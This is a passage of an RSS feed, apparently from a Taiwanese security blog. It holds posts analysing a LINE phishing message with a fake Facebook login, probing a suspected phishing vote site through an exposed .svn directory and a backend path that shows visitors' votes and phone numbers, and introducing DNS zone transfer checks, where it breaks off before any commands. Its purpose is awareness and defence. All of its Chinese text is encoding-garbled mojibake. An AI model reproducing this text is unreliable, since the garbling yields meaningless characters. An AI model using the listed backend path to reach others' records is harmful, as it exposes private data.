&lt;p&gt;Á´ãÂàªÊääËá™Â∑±ÁöÑÁ∂≤Á´ôÂä†‰∏ä Session ‰øùË≠∑Ê©üÂà∂ÂêßÔºÅ&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/06/03/http-session-protection/</link>
                <guid>https://devco.re/blog/2014/06/03/http-session-protection</guid>
                <pubDate>Tue, 03 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>LINE ÂÖçË≤ªË≤ºÂúñÈá£È≠öË®äÊÅØÂàÜÊûê</title>
                <description>&lt;p&gt;Êôö‰∏äÁ™ÅÁÑ∂Êé•Âà∞Á§æÁæ§ÊúãÂèãÂÇ≥ LINE ÁöÑË®äÊÅØÈÅé‰æÜÔºåÂÆöÁùõ‰∏ÄÁúã‰∏¶‰∏çÂñÆÁ¥î„ÄÇÈÄôÁ∂≤ÂùÄÁúãËµ∑‰æÜÂ∞±ÊòØÈá£È≠öÁ∂≤Á´ôÂïäÔºüÊÄéÈ∫ºÊúÉÈÄôÊ®£Âë¢ÔºüÈõ£ÈÅìÊòØÊúãÂèãÂú®Ê∏¨Ë©¶ÊàëÂÄëÁöÑË≠¶Ë¶∫ÂøÉÂ§†‰∏çÂ§†ÂóéÔºüËÆìÊàëÂÄëÁúã‰∏ãÂéªÈÄôÂÄãÈá£È≠öÁ∂≤È†ÅÊÄéÈ∫ºÁé©„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_01.png&quot; alt=&quot;LINE ÂÇ≥ÈÄÅË¥àÈÄÅË≤ºÂúñË®äÊÅØÈá£È≠ö&quot; title=&quot;LINE ÂÇ≥ÈÄÅË¥àÈÄÅË≤ºÂúñË®äÊÅØÈá£È≠ö&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Ê≠§ LINE Èá£È≠öË®äÊÅØË™™Âè™Ë¶ÅÂπ´ÂøôËΩâÁôº 15 Ê¨°Ë®äÊÅØÔºåÂ∞±ÊúÉË¥àÈÄÅË≤ºÂúñ„ÄÇÂÖà‰∏çË´ñ LINE ÊúâÊ≤íÊúâÈÄôÊ®£ÁöÑÊ©üÂà∂ÔºåÊàëÂÄëÂÖàÁõ¥Êé•ÈªûÈÅ∏ÈÄ£ÁµêÁúãÁúãËë´ËòÜË£°Ë≥£‰ªÄÈ∫ºËó•„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_02.png&quot; alt=&quot;LINE Èá£È≠öÂÅáË≤ºÂúñÁ∂≤È†Å&quot; title=&quot;LINE Èá£È≠öÂÅáË≤ºÂúñÁ∂≤È†Å&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÁÄèË¶ΩÂô®ÊâìÈñã‰πãÂæåÔºåË∑≥Âá∫‰∫ÜÈ†òÂèñË≤ºÂúñÁöÑ„ÄåÁ∂≤È†Å„ÄçÔºåËÄå‰∏îÈÇÑÊúâË©≠Áï∞ÁöÑÁ¥ÖÂ≠ó„ÄÇÂêÑÁ®ÆË∑°Ë±°ÈÉΩË∑ü‰∏ÄËà¨È†òÂèñË≤ºÂúñÁöÑÊ®°Âºè‰∏çÂêåÔºåÂ§™‰ª§‰∫∫Ëµ∑Áñë‰∫Ü„ÄÇÈªû‰∫ÜÂúñÂ∞±ÊúÉË∑≥Âà∞ Facebook ÁôªÂÖ•È†ÅÈù¢„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_03.png&quot; alt=&quot;ÂÅá Facebook ÁôªÂÖ•È†ÅÈù¢È®ôÂèñÂ∏≥ËôüÂØÜÁ¢º&quot; title=&quot;ÂÅá Facebook ÁôªÂÖ•È†ÅÈù¢È®ôÂèñÂ∏≥ËôüÂØÜÁ¢º&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÊòéÁúº‰∫∫ÁúãÂà∞ÈÄôÂÄã Facebook ÁôªÂÖ•È†ÅÈù¢Â∞±ÊúÉÁôºÁèæÂ§™ÂÅá‰∫ÜÔºåÁ†¥Á∂ªÂ§öÂ§ö„ÄÇLogo„ÄÅÁ∂≤ÂùÄ„ÄÅÁ∂≤È†ÅÊ†ºÂºèÁ†¥Êùø„ÄÅÁ∞°È´îÂ≠óÔºåÂ§™Â§ö‰ª§‰∫∫Êá∑ÁñëÁöÑÂú∞Êñπ‰∫Ü„ÄÇÂú®ÈÄôÈÇäÊàëÂÄëÂè™Ë¶ÅÈö®‰æøËº∏ÂÖ•Â∏≥ËôüË∑üÂØÜÁ¢ºÔºåÂ∞±ËÉΩÂà∞‰∏ãÂÄãÁï´Èù¢„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_04.png&quot; alt=&quot;ÂÅá Facebook ÁôªÂÖ•ÂÆåÊàêÈ†ÅÈù¢&quot; title=&quot;ÂÅá Facebook ÁôªÂÖ•ÂÆåÊàêÈ†ÅÈù¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÁµêÊûúÁï∂ÁÑ∂ÊòØ‰∏çÊúÉÁµ¶‰Ω†Ë≤ºÂúñÂï¶ÔºÅËÄå‰∏îÁ∂≤ÂùÄ„Äåcuowu„ÄçÊòØ„ÄåÈåØË™§„ÄçÁöÑÊãºÈü≥Ôºå‰πüÊö¥Èú≤‰∫ÜÁ∂≤Á´ô‰ΩúËÄÖÁöÑË∫´ÂàÜ„ÄÇÁõ¥Êé•Áî®ÁÄèË¶ΩÂô®ÁúãÂÇ≥ÈÅûÁöÑÈ†ÅÈù¢Âè´ÂÅö„Äåtj.asp„ÄçÔºå„Äåtj„ÄçÊ≠£Â•ΩÊòØ„ÄåÊèê‰∫§„ÄçÔºåÁï´Èù¢‰∏äÁöÑÈåØË™§Ë®äÊÅØÊõ¥ÊòØÂ§ßÂâåÂâåÁöÑÁõ¥Êé•ÁßÄÂá∫Á∞°È´îÂ≠ó„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_05.png&quot; alt=&quot;Èá£È≠öÁ∂≤Á´ôÁ∂≤È†ÅË®äÊÅØ&quot; title=&quot;Èá£È≠öÁ∂≤Á´ôÁ∂≤È†ÅË®äÊÅØ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;‰∫ãÂæåÂèã‰∫∫Áõ¥Êé•Ë™™ LINE Â∏≥ËôüË¢´ÁõúÁî®ÁôºË®äÊÅØ‰∫ÜÔºåËÄå‰∏îÂØÜÁ¢ºÂèØËÉΩÈÅéÊñºÁ∞°ÂñÆ„ÄÅ‰πüÊ≤íÊúâË®≠ÂÆöÊèõÊ©üÂØÜÁ¢º„ÄÇÂõ†Ê≠§Âú®ÈÄôÈÇäÂëºÁ±≤Â§ßÂÆ∂ÂÅöÂ•Ω LINE ÁöÑÂÆâÂÖ®Ë®≠ÂÆöÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Âä†Âº∑ÂØÜÁ¢ºÈï∑Â∫¶„ÄÅË§áÈõúÂ∫¶&lt;/li&gt;
  &lt;li&gt;Ë®≠ÂÆö„ÄåÊèõÊ©üÂØÜÁ¢º„Äç&lt;/li&gt;
  &lt;li&gt;Ëã•Âè™Âú®ÊâãÊ©ü‰ΩøÁî® LINEÔºåÂèØÂ∞á„ÄåÂÖÅË®±Ëá™ÂÖ∂‰ªñË£ùÁΩÆÁôªÂÖ•„ÄçÈóúÈñâ&lt;/li&gt;
  &lt;li&gt;Â¶ÇÊûúÊúâÂ∏≥ËôüË¢´ÁõúÁãÄÊ≥ÅÔºåË∂ïÂø´ËÅØÁµ° LINE &lt;a href=&quot;https://line.naver.jp/cs/&quot;&gt;https://line.naver.jp/cs/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Â§ßÂÆ∂Âú®‰∫´ÂèóÈÄöË®äËªüÈ´îËàáÊúãÂèãÂÇ≥Ë®äË≤ºÂúñÁöÑÂêåÊôÇÔºå‰πüÂøÖÈ†àË¶ÅÊ≥®ÊÑèÊúâÂøÉ‰∫∫Â£´Âà©Áî®ÈÄô‰∫õÁÆ°ÈÅìÁ´äÂèñ‰Ω†ÁöÑÂ∏≥ËôüÂØÜÁ¢ºÂñîÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/12/line-phishing/</link>
                <guid>https://devco.re/blog/2014/05/12/line-phishing</guid>
                <pubDate>Mon, 12 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Êê∂Êê≠Ê†∏ÂõõËàáÊúçË≤øÁÜ±ÊΩÆÁöÑÊΩõÂú®Ë©êÈ®ôÁ∂≤Á´ô</title>
                <description>&lt;h3 id=&quot;votetwam&quot;&gt;vote.tw.am&lt;/h3&gt;

&lt;p&gt;ÊúÄËøëÂæàÂ§ö‰∫∫ÈÉΩÊî∂Âà∞‰∫Ü‰∏ÄÂÄãÁúãËµ∑‰æÜÂæàÂÉèÈá£È≠öÁ∂≤Á´ôÁöÑÊ†∏ÂõõÊäïÁ•®Á´ôÂè∞Á∞°Ë®äÔºåÂ¶Ç‰∏ãÂúñÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/1.vote.tw.am.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/1.vote.tw.am.jpg&quot; alt=&quot;Ê†∏ÂõõÊäïÁ•®Á´ôÂè∞Á∞°Ë®ä&quot; title=&quot;Ê†∏ÂõõÊäïÁ•®Á´ôÂè∞Á∞°Ë®ä&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄë‰πüÊî∂Âà∞‰∫ÜÔºå‰ΩÜÊòØÂâõÂêÉÈ£ΩÈ£ØÂØ¶Âú®ÂæàÊÉ≥Áù°Ë¶∫Ôºå‰∏çÂ§™ÊÉ≥ÁêÜ‰ªñÔºåÊñºÊòØÂ∞±Âøç‰∏ç‰ΩèË∂¥‰∏ãÁù°Ë¶∫ÔºåÁ´üÁÑ∂ÂÅö‰∫ÜÂÄãÂ§¢‚Ä¶..&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;Á´ôÂè∞ÂÖßÂÆπ&quot;&gt;Á´ôÂè∞ÂÖßÂÆπ&lt;/h3&gt;

&lt;p&gt;Âú®Â§¢‰∏≠ÊâãÊªëÊâìÈñã‰∫ÜÁ∂≤È†ÅÔºåÂÖßÂÆπÈï∑ÂæóÂÉèÈÄôÂÄãÊ®£Â≠êÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/2.vote.tw.am_votepage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/2.vote.tw.am_votepage.png&quot; alt=&quot;Ê†∏ÂõõÊäïÁ•®Á´ôÂè∞È†ÅÈù¢&quot; title=&quot;Ê†∏ÂõõÊäïÁ•®Á´ôÂè∞È†ÅÈù¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Áúã‰∫ÜÁúüÊòØÈùûÂ∏∏ÁöÑÁæ©ÊÜ§Â°´ËÜ∫ÔºÅÈ¶¨‰∏äÂ∞±ÊÉ≥Êäï‰∏ãÁ•ûËÅñÁöÑ‰∏ÄÁ•®ÔºÅ‰ΩÜÊòØÂøΩÁÑ∂ËÅΩÂà∞Âë®ÂÖ¨ÊåáÁ§∫Ë™™Á∂≤Á´ôÂ∫ï‰∏ãÊúâÂ•áÊÄ™ÁöÑÁõÆÈåÑÔºåÁÖßËëóÁ•ûË´≠‰∏ÄË©¶ÔºåÁôºÁèæÊúâ .svn ÁõÆÈåÑË∑ü entries Ê™îÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/3.svn_entries.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/3.svn_entries.png&quot; alt=&quot;.svn ÁõÆÈåÑ&quot; title=&quot;.svn ÁõÆÈåÑ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôÊôÇÂÄô‰∏âÂ§™Â≠êÂì™ÂêíÂâõÂ•ΩË∑ØÈÅéÔºåË™™‰ªñÂâõÂâõÂú® Pastebin ÁúãÂà∞Êúâ‰∫∫Ë≤º‰∫Ü&lt;a href=&quot;http://pastebin.com/4iEVWh24&quot;&gt;‰∏ÄÁØáË∑üÈÄôÂÄãÁ∂≤Á´ôÂ•ΩÂÉèÊúâÈóúËÅØÁöÑÂÖßÂÆπ&lt;/a&gt;ÔºåË¨õÂÆå‰ªñÂ∞±ÈñãËëóÊ∞¥ËªäË∑ëÂéªÈéÆÂ£ìÈæçÂÆÆ‰∫Ü„ÄÇÈªûÈñãÈÇ£ÁØáÂÖßÂÆπ‰∏ÄÁúãÔºåÂÖßÂÆπÊúâ‰∏Ä‰∫õÂæàÂ•áÊÄ™ÁöÑÁ∂≤ÂùÄÔºåËÆì‰∫∫Áúã‰∫ÜÂ∞±ÂæàÊÉ≥ÈªûÔºÅÈö®‰æøÈÅ∏‰∫Ü‰∏ÄÂÄã http://vote.tw.am/2N9E6V4E5R4BABC0647469FF213F2D94A27FA/chose_vote.include.php ÊâìÈñã‰æÜÁúãÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/4.vote.tw.am_homepage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/4.vote.tw.am_homepage.png&quot; alt=&quot;ÊäïÁ•®È†ÖÁõÆ&quot; title=&quot;ÊäïÁ•®È†ÖÁõÆ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÂìáÂ°ûÔºÅÂéü‰æÜÂæûÊúçË≤øÂ∞±Â∑≤Á∂ìÈñãÂßã‰∫ÜÂë¢ÔºÅËÆìÊàëÂÄëÁπºÁ∫åÈªûÈÄ≤ÂéªÁúãÁúãÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/5.vote.tw.am_navigation.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/5.vote.tw.am_navigation.png&quot; alt=&quot;ÊäïÁ•®ÁµêÊûúÂ∞éË¶ΩÈ†ÅÈù¢&quot; title=&quot;ÊäïÁ•®ÁµêÊûúÂ∞éË¶ΩÈ†ÅÈù¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÁúãËµ∑‰æÜÊòØÂÄãÂæåÂè∞ÔºåÂèØ‰ª•ÁÄèË¶Ω‰ΩøÁî®ËÄÖÁöÑÊäïÁ•®Ë®òÈåÑ„ÄÅÁïôË®ÄÁ≠âË≥áÊñôÔºåÈÇ£Â∞±ÈªûÂÄãÊäïÁ•®Ë®òÈåÑ‰æÜÁúãÁúãÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/6.vote.tw.am_vote_record.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/6.vote.tw.am_vote_record.png&quot; alt=&quot;ÊäïÁ•®Ë®òÈåÑ&quot; title=&quot;ÊäïÁ•®Ë®òÈåÑ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÊûúÁÑ∂Ë£°Èù¢Â≠òËëóÁúæÂ§öÊ∞ëÁúæÁöÑÊäïÁ•®Ë®òÈåÑÔºåÈÇ£È∫ºÁî®Êà∂ÂèçÈ•ãÊáâË©≤Â∞±ÊòØÁïôË®Ä‰∫Ü‚Ä¶&lt;/p&gt;

&lt;p&gt;ÂæûÈÄô‰∫õÂÖßÂÆπÁúã‰æÜÔºåÊáâË©≤ÊòØÊúâÂÄãÈõÜÂúòÊìÅÊúâÂ§ßÈáèÁöÑÊ∞ëÁúæÂÄãË≥áÔºå‰∏¶‰∏î‰∏Ä‰∏ÄÁôºÈÄÅË®äÊÅØÁµ¶ÈÄô‰∫õ‰∫∫ÔºåËÉåÂæåÁõÆÁöÑÂ∞ö‰∏çÂæóËÄåÁü•„ÄÇÊúâÂèØËÉΩÊòØÂ§ßÈô∏‰∫∫ÊÉ≥Âà©Áî®ÈÄôÂÄãÁÜ±ÊΩÆÁ¢∫Ë™çÈÄô‰∫õÈõªË©±ËôüÁ¢ºÊòØÂê¶ÁúüÂØ¶„ÄÅÂèØÁî®Ôºå‰πüÊúâÂèØËÉΩÊòØ‰∏çÁü•ÂêçÁöÑÈªëÊâãÊ≠£Âú®Á≠ñÂäÉ‰∏ã‰∏ÄÂÄãÊâìÂ£ìÂãï‰ΩúÔºüÊ≠£Áï∂ÊàëÂÄëÊÉ≥ÊêûÊ∏ÖÊ•öÂ∞çÊñπÁ©∂Á´üÊòØÈÄèÈÅéÈõªË©±ËôüÁ¢ºÈÇÑÊòØ‰ø°ÁÆ±ÂÇ≥ÈÄÅ iMessage ÊôÇÔºåÂì™ÂêíÂøΩÁÑ∂ÂèàË∑ØÈÅé‰∫ÜÔºå‰∏ü‰∫ÜÈÄôÂºµÂúñ‰πãÂæåÂè´ÊàëÂÄë‰∏çË¶ÅÂÜçÁûéÂøô‰∫ÜË∂ïÂø´ÂõûÂÆ∂Ê¥óÊ¥óÁù°Ôºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/7.scam.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/7.scam.png&quot; alt=&quot;IP„ÄÅÊôÇÈñì„ÄÅÈõªË©±„ÄÅÂõûÊáâÂÖßÂÆπÁ≠âË≥áÊñô&quot; title=&quot;IP„ÄÅÊôÇÈñì„ÄÅÈõªË©±„ÄÅÂõûÊáâÂÖßÂÆπÁ≠âË≥áÊñô&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÊûúÁÑ∂ÊúâÈõªË©±ÔºÅÁ©∂Á´üÈÄô‰ª∂‰∫ãÔºåÊòØÊúâÁ∂≤Á´ôÂ§ßÈáèÊ¥©ÊºèÂÄãË≥áÔºåÈÇÑÊòØÊúâ‰∫∫Âú®Ê∞ëÈÅãÊúüÈñìÂà©Áî®ÈÄôËÇ°ÁÜ±ÊΩÆËíêÈõÜÂÄãË≥áÔºåÊäëÊàñÊòØËÉåÂæåÊúâ‰ªÄÈ∫º‰∏çÂèØÂëä‰∫∫ÁöÑÁßòÂØÜÂë¢ÔºüËÆìÊàëÂÄëÁπºÁ∫åÁúã‰∏ãÂéªÔΩû&lt;/p&gt;

&lt;h3 id=&quot;Â§¢ÈÜíÊôÇÂàÜ&quot;&gt;Â§¢ÈÜíÊôÇÂàÜ&lt;/h3&gt;

&lt;p&gt;‰∏äÁè≠ÊôÇÈñì‰∏çËÉΩÂçàÁù°Â§™‰πÖÔºåÊñºÊòØÂë®ÂÖ¨Â∞±ÊääÊàëÂÄëÂè´ÈÜí‰∫Ü‚Ä¶..&lt;/p&gt;

&lt;p&gt;Â∞çÊñºÈÄôÊ®£ÁöÑÂ§¢Â¢ÉÊàëÂÄëÊúâ‰ª•‰∏ãÂª∫Ë≠∞Ôºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;‰∏çË¶ÅÈö®ÊÑèÈªûÊìä‰æÜË∑Ø‰∏çÊòéÁöÑÁ∞°Ë®äÂÖßÂÆπ&lt;/li&gt;
  &lt;li&gt;Âú®Á∂≤Ë∑Ø‰∏äÂ°´ÂØ´‰ªª‰ΩïÂÖßÂÆπ‰πãÂâçÂÖàÊü•Ë≠âË©≤Á∂≤Á´ôÊòØÂê¶ÂèØÁñë&lt;/li&gt;
  &lt;li&gt;Â∞çÊñº yijapperj@hotmail.com ÈÄôÁ®ÆÂèØÁñëÂ∏≥ËôüÊâÄÂÇ≥‰æÜÁöÑ‰ªª‰ΩïË≥áÊñôÔºåË´ã‰øùÊåÅÈ´òÂ∫¶Ë≠¶Êàí&lt;/li&gt;
  &lt;li&gt;Â∞çÊñº vote.tw.am ÈÄôÁ®ÆÁúãËµ∑‰æÜÁñë‰ººË¶ÅÂÅΩË£ùÊàê .tw Á∂≤ÂüüÁöÑÁ´ôÂè∞Ôºå‰πüË´ã‰øùÊåÅÈ´òÂ∫¶Ë≠¶Êàí&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ê≠°ËøéÂ§ßÂÆ∂ËΩâÁôºÈÄôÂÄãÊ∂àÊÅØÂà∞ÂêÑÂ§ßÁ∂≤Á´ô„ÄÅÁ≤âÁµ≤Âúò„ÄÅBBSÔºåÂëäË®¥ÂêÑÂÄãÁÜ±ÂøÉÂÖ¨ÁõäÁöÑÈÑâÊ∞ëÂÄëÂà•ÂÜçÈªûÊìäËàáÂõûÊáâ‰æÜË∑Ø‰∏çÊòéÁöÑÁ∞°Ë®äÂõâÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site/</link>
                <guid>https://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site</guid>
                <pubDate>Wed, 07 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Zone Transfer CVE-1999-0532 - Âè§ËÄÅÁöÑ DNS Ë≥áÂÆâË≠∞È°å</title>
                <description>&lt;h3 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Domain_Name_System&quot;&gt;DNS&lt;/a&gt; ÊòØÂú® 1983 Âπ¥Áî± Paul Mockapetris ÊâÄÁôºÊòéÔºåÁõ∏ÈóúË¶èÁØÑÂàÜÂà•Âú® &lt;a href=&quot;http://tools.ietf.org/html/rfc1034&quot;&gt;RFC 1034&lt;/a&gt; ‰ª•Âèä &lt;a href=&quot;http://tools.ietf.org/html/rfc1035&quot;&gt;RFC 1035&lt;/a&gt;„ÄÇÂÖ∂‰∏ªË¶Å‰ΩúÁî®ÊòØÁî®‰æÜË®òÊÜ∂ IP ‰ΩçÂùÄËàáËã±Êñá‰πãÈñìÁöÑÂ∞çÊáâÈóú‰øÇÔºåËÆì‰∫∫È°ûÂèØ‰ª•Áî®ËºÉÁ∞°ÂñÆÁöÑÊñπÂºèË®òÂæó‰∏ªÊ©üÂêçÁ®±„ÄÇÁõÆÂâç‰∏ÄËà¨Ê∞ëÁúæÂ§ßÂ§ö‰ΩøÁî® ISP ÊàñÂúãÈöõÁü•ÂêçÂÖ¨Âè∏Êèê‰æõÁöÑ DNS serverÔºåÂ¶Ç‰∏≠ËèØÁöÑ 168.95.1.1 ÊàñÊòØ Google ÁöÑ 8.8.8.8 Á≠âÁ≠â„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁÑ∂ËÄåÂ∞çÊñº‰ºÅÊ•≠ËÄåË®ÄÔºåÂèØËÉΩÈúÄË¶ÅÊû∂Ë®≠Â§ßÈáèÊ©üÂô®ÊàñÂÖßÈÉ®Á≥ªÁµ±ÔºåÂèàÂ∏åÊúõ‰ª•Á∞°ÂñÆÁöÑÊñπÂºèË®òÊÜ∂‰∏ªÊ©üÂêçÁ®±ÔºåÂõ†Ê≠§Ë®±Â§ö‰ºÅÊ•≠ÊúâËá™Ë°åÊû∂Ë®≠ DNS server ÁöÑÈúÄÊ±Ç„ÄÇÂêåÊôÇ‰ºÅÊ•≠ÈÄöÂ∏∏‰πüÊúÉÂª∫Á´ãÂπæÂè∞ÂÇôÊè¥ DNS serverÔºå‰ª•ÈÅøÂÖç DNS ÊúçÂãôÂøΩÁÑ∂‰∏≠Êñ∑„ÄÇ‰ΩÜÊòØÁï∂‰ºÅÊ•≠ÊúâÂ§öÂè∞ DNS server ÊôÇÔºåÂ∞±ÂøÖÈ†àËÄÉÈáè DNS Ë®òÈåÑÁöÑÂêåÊ≠•ÂïèÈ°åÔºåÈÄöÂ∏∏ÊúÉ‰ΩøÁî® &lt;a href=&quot;http://en.wikipedia.org/wiki/DNS_zone_transfer&quot;&gt;zone transfer&lt;/a&gt; ÈÄôÂÄãÂäüËÉΩ‰æÜÂêåÊ≠•Ë®òÈåÑ„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;ÁÑ∂ËÄåËã•ÁÆ°ÁêÜËÄÖÊú™ÂÅöÂ•ΩÁõ∏ÈóúË®≠ÂÆöÔºå‰ΩøÊâÄÊúâ‰æÜÊ∫êÁöÜÂèØÂ∞ç‰ºÅÊ•≠ÁöÑ DNS ‰∏ªÊ©üÈÄ≤Ë°å zone transfer Êü•Ë©¢ÔºåÂâáÊúâÊ©üÊúÉËÆìÊ≠§ÂäüËÉΩÊàêÁÇ∫‰ºÅÊ•≠ÈÅ≠ÂèóÊîªÊìäÁöÑËµ∑Èªû„ÄÇÁî®ÁèæÂØ¶ÁîüÊ¥ªÊÉÖÂ¢ÉËàâ‰æãÁöÑË©±ÔºåÂ∞çÂ§ñÈñãÊîæ zone transfer Â∞±Â¶ÇÂêåÊâÄÊúâ‰∫∫ÈÉΩÂèØ‰ª•‰ªªÊÑèÊü•Ë©¢‰Ω†Âêç‰∏ãÁöÑÊâÄÊúâÊàøÂú∞Áî¢‰ΩçÂú®‰ΩïËôïÔºåÂÅáÂ¶ÇÊúâ‰∫∫Ë¶ÅÈáùÂ∞çÊÄßÁöÑÊîªÊìä‰Ω†ÔºåÈö®ÊôÇÈÉΩÂèØ‰ª•ÂéªÁúã‰Ω†ÊüêÂÄãÊàøÂú∞Áî¢ÊúâÊ≤íÊúâÂì™ÊâáÈñÄÁ™óÊ≤íÈóúÂ•ΩÔºå‰º∫Ê©üÂÖ•‰æµ‰Ω†ÁöÑÂÆ∂Âúí„ÄÇ‰∏ÄËà¨ÊàëÂÄëÂ∞ç‰ºÅÊ•≠Ë≥áË®äÁ≥ªÁµ±ÈÄ≤Ë°å&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;Êª≤ÈÄèÊ∏¨Ë©¶&lt;/a&gt;ÊôÇÔºåÂú®Ë≥áË®äÊêúÈõÜÁöÑÈöéÊÆµ‰πüÊúÉÂÖàÂæû domain name ‰∏ãÊâãÔºåÂõ†Ê≠§ DNS Áõ∏ÈóúË≥áÊñôÁöÑÈáçË¶ÅÊÄßÂèØË¶ã‰∏ÄÊñë„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-1999-0532&quot;&gt;Zone transfer ÁöÑË≥áÂÆâË≠∞È°åÊó©Âú® 1999 Âπ¥Â∞±Â∑≤Êúâ‰∫∫ÊèêÂá∫&lt;/a&gt;ÔºåÁêÜÊáâÊàêÁÇ∫ÂêÑ‰ºÅÊ•≠ÈÄ≤Ë°åË≥áÂÆâÁ®ΩÊ†∏ÁöÑÊ≠•È©ü‰πã‰∏Ä„ÄÇÁÑ∂ËÄåÂçÅ‰∫îÂπ¥ÈÅéÂéª‰∫ÜÔºåÂú®ËøëÊúüÊàëÂÄëÂçªÁôºÁèæË®±Â§öÂúãÂÖßÂ§ß‰ºÅÊ•≠‰ªçÊúâÊ≠§ÂïèÈ°åÔºå‰ª§‰∫∫ÈùûÂ∏∏È©öË®ùÔºÅÁ©∂Á´ü‰ºÅÊ•≠Ë©≤Â¶Ç‰ΩïÊ™¢Ê∏¨Ëá™Ë∫´ÊòØÂê¶Â≠òÂú®ÈÄôÁ®ÆÂÆâÂÖ®ÊºèÊ¥ûÔºüÊ≠§ÂïèÈ°åÁõÆÂâçÂú®Âè∞ÁÅ£Á∂≤Ë∑ØÁí∞Â¢É‰ΩîÊúâÂ§öÂ§ßÁöÑÊØî‰æãÔºüZone transfer ÊúÉÂ∞ç‰ºÅÊ•≠ÈÄ†Êàê‰ªÄÈ∫ºÂΩ±ÈüøÔºüËÆìÊàëÂÄëÁπºÁ∫åÁúã‰∏ãÂéªÔΩû&lt;/p&gt;

&lt;h3 id=&quot;zone-transfer-Ê™¢Ê∏¨ÊñπÂºè&quot;&gt;Zone Transfer Ê™¢Ê∏¨ÊñπÂºè&lt;/h3&gt;

&lt;p&gt;È¶ñÂÖàÈúÄÊÑüË¨ù &lt;a href=&quot;http://www.digininja.org/&quot;&gt;DigiNinja&lt;/a&gt; Êèê‰æõ‰∫Ü‰∏ÄÂÄã&lt;a href=&quot;http://www.digininja.org/projects/zonetransferme.php&quot;&gt;ËÆìÂ§ßÂÆ∂Ëá™Áî±Ê∏¨Ë©¶ÁöÑ zonetransfer.me Á∂≤Âüü&lt;/a&gt;Ôºå‰ª•‰∏ãÊàëÂÄëÂàÜÂà•Âú® Linux Âèä Windows Áí∞Â¢É‰∏ãÈÄ≤Ë°åÊ™¢Ê∏¨„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;linux&quot;&gt;Linux&lt;/h4&gt;

&lt;p&gt;Âú® Linux Áí∞Â¢ÉÂÖßÔºåÊàëÂÄëÂèØÂà©Áî® &lt;a href=&quot;http://linux.vbird.org/linux_server/0350dns.php#dig&quot;&gt;dig&lt;/a&gt; Êåá‰ª§Êü•Ë©¢ÁõÆÊ®ô domain ‰ΩøÁî®Âì™‰∫õ name serverÔºö&lt;/p&gt;

